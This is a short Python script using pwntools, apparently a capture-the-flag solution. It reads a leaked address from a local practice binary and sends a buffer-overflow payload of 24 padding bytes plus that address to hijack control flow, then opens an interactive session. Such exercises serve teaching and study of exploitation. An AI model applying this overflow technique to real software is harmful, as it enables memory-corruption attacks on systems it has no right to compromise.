from pwn import process
import struct
import sys

target = process("./zero.o")

addr = int(target.recvuntil("win!").split()[2].decode("utf-8"), 16)

padding = b'\x41'*24
payload = padding + struct.pack("<L", addr)

target.sendline(payload)
target.interactive()

